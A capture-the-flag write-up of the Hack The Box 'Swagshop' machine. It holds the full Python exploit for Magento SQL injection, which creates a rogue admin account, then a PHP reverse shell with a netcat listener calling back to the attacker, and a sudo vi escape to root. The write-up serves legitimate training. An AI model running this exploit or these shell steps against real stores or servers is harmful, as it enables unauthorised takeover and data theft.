# Introduction

This is my first Hack The Box writeup. The target is "Swagshop" 10.10.10.140
https://www.hackthebox.eu/home/machines/profile/188

# Initial Enumeration
First attempt to identify listening services on the target using nmap:

```
nmap -A -sV -Pn -p- 10.10.10.140
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-15 16:01 EDT
Stats: 18:28:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 10:30 (0:00:07 remaining)
Nmap scan report for 10.10.10.140
Host is up (0.24s latency).
Not shown: 64456 closed ports, 1077 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Error 503: Service Unavailable
Device type: firewall
Running (JUST GUESSING): Fortinet embedded (87%)
OS CPE: cpe:/h:fortinet:fortigate_100d
Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68088.70 seconds
```
There are two open ports. An ssh server and an Apache webserver are listening. Perhaps we could use hydra or another password-guessing attack tool against ssh but it's assumed that the creator has not chosen a lame password for root. We don't know any other usernames so there's nothing further we can do with the ssh service.

On the other hand, that webserver on port 80 might be worth a deeper look.

# Deeper Recon
Browsing to the site (with Burp of course) and using nikto we learn that a Magento CMS is installed.

```
nikto -h http://10.10.10.140 -C all

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.140
+ Target Hostname:    10.10.10.140
+ Target Port:        80
+ Start Time:         2019-08-18 12:54:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Magento Go CMS
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3268: /app/: Directory indexing found.
+ OSVDB-3092: /app/: This might be interesting...
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3268: /lib/: Directory indexing found.
+ OSVDB-3092: /lib/: This might be interesting...
+ OSVDB-3092: /install.php: install.php file found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /RELEASE_NOTES.txt: A database error may reveal internal details about the running database.
+ /RELEASE_NOTES.txt: Magento Shop Changelog identified.
+ /downloader/: Magento Connect Manager login identified. This might also reval the installed version of Magento
+ /skin/adminhtml/default/default/media/editor.swf: Several Adobe Flash files that ship with Magento are vulnerable to DOM based Cross Site Scripting (XSS). See http://appcheck-ng.com/unpatched-vulnerabilites-in-magento-e-commerce-platform/
+ /skin/adminhtml/default/default/media/uploader.swf: Several Adobe Flash files that ship with Magento are vulnerable to DOM based Cross Site Scripting (XSS). See http://appcheck-ng.com/unpatched-vulnerabilites-in-magento-e-commerce-platform/
+ /skin/adminhtml/default/default/media/uploaderSingle.swf: Several Adobe Flash files that ship with Magento are vulnerable to DOM based Cross Site Scripting (XSS). See http://appcheck-ng.com/unpatched-vulnerabilites-in-magento-e-commerce-platform/
+ 26480 requests: 8 error(s) and 20 item(s) reported on remote host
+ End Time:           2019-08-18 13:39:17 (GMT-4) (2677 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

We are able to gather information about the version of Magento.

Magento is written in PHP and is worth investigating.

# Initial Exploit

Search for Magento exploits!
```
searchsploit -w magento
--------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                                               |  URL
--------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                           | https://www.exploit-db.com/exploits/32808
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                     | https://www.exploit-db.com/exploits/32809
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                    | https://www.exploit-db.com/exploits/32810
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                               | https://www.exploit-db.com/exploits/39838
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                 | https://www.exploit-db.com/exploits/37811
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                       | https://www.exploit-db.com/exploits/35996
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                  | https://www.exploit-db.com/exploits/35052
Magento eCommerce - Local File Disclosure                                                                                                    | https://www.exploit-db.com/exploits/19793
Magento eCommerce - Remote Code Execution                                                                                                    | https://www.exploit-db.com/exploits/37977
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                 | https://www.exploit-db.com/exploits/38573
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                      | https://www.exploit-db.com/exploits/38651
--------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Result
```

RCE is always helpful!

Magento eCommerce - Remote Code Execution                                                                                                    https://www.exploit-db.com/exploits/37977

Based on the version of Magento this exploit should work!

# Unprivileged Reverse Shell

Modify the exploit appropriately:
```
cat 37977.py 
import requests
import base64
import sys

target = "http://10.10.10.140/"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="forme", password="forme")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url, 
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds forme:forme".format(target)
else:
    print "DID NOT WORK"

print r.ok
```

Run it! Yes! We get an account created!

username: forme
password: forme

Use the admin panel->Filesystem->IDE tool to edit an existing .php file
http://10.10.10.140/index.php/filesystem/adminhtml_filesystem/index/key/03a087d4216efe45c617f76e40c77adb/

Replace contents of http://10.10.140/cron.php with a reverse shell (I used /usr/share/webshells/php/php-reverse-shell.php
 from my Kali machine)

Start a netcat listener on your attack machine:
```
nc -klnvp 8888
```

Trigger the reverse shell: eg
```
http://10.10.10.140/cron.php
```

Voila! Reverse shell!
```
connect to [10.10.15.56] from (UNKNOWN) [10.10.10.140] 43662
Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 16:24:44 up 7 min,  0 users,  load average: 0.10, 0.10, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Enumeration as Unprivileged User
Great! We have a shell on the target.

First things first:
```
$ ls -laR /home
/home:
total 12
drwxr-xr-x  3 root  root  4096 May  2 14:48 .
drwxr-xr-x 23 root  root  4096 May  2 14:55 ..
drwxr-xr-x  3 haris haris 4096 May  8 09:21 haris

/home/haris:
total 36
drwxr-xr-x 3 haris haris 4096 May  8 09:21 .
drwxr-xr-x 3 root  root  4096 May  2 14:48 ..
-rw------- 1 haris haris   54 May  2 14:56 .Xauthority
lrwxrwxrwx 1 root  root     9 May  8 09:20 .bash_history -> /dev/null
-rw-r--r-- 1 haris haris  220 May  2 14:48 .bash_logout
-rw-r--r-- 1 haris haris 3771 May  2 14:48 .bashrc
drwx------ 2 haris haris 4096 May  2 14:49 .cache
-rw------- 1 root  root     1 May  8 09:20 .mysql_history
-rw-r--r-- 1 haris haris  655 May  2 14:48 .profile
-rw-r--r-- 1 haris haris    0 May  2 14:49 .sudo_as_admin_successful
-rw-r--r-- 1 haris haris   33 May  8 09:01 user.txt
ls: cannot open directory '/home/haris/.cache': Permission denied
$ su haris
su: must be run from a terminal
$ cd /home/haris
$ ls -la
total 36
drwxr-xr-x 3 haris haris 4096 May  8 09:21 .
drwxr-xr-x 3 root  root  4096 May  2 14:48 ..
-rw------- 1 haris haris   54 May  2 14:56 .Xauthority
lrwxrwxrwx 1 root  root     9 May  8 09:20 .bash_history -> /dev/null
-rw-r--r-- 1 haris haris  220 May  2 14:48 .bash_logout
-rw-r--r-- 1 haris haris 3771 May  2 14:48 .bashrc
drwx------ 2 haris haris 4096 May  2 14:49 .cache
-rw------- 1 root  root     1 May  8 09:20 .mysql_history
-rw-r--r-- 1 haris haris  655 May  2 14:48 .profile
-rw-r--r-- 1 haris haris    0 May  2 14:49 .sudo_as_admin_successful
-rw-r--r-- 1 haris haris   33 May  8 09:01 user.txt
$ cat user.txt
<FLAG!>
```

# Privilege Escalation to root

This one turned out to be simple. It's always worth checking to see that access the user account already has:
```
www-data@swagshop:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

**Wow. This user can run vi as root with no password!**

vi and its kindred have one of the most famous "shell breakouts" ever - so this is definitely worth pursuing:
https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=8

The slight caveat is that wwww-data can only do so when editing a file in /var/www/html/ - but that's not a big deal.

```
sudo /usr/bin/vi /var/www/html/testfile.sh

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'
:!bash
[No write since last change]                                  1,1           All
root@swagshop:/home/haris# id
id
uid=0(root) gid=0(root) groups=0(root)
root@swagshop:~# cat root.txt
cat root.txt
<FLAG!>

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
```

Done. We have root access on the machine!
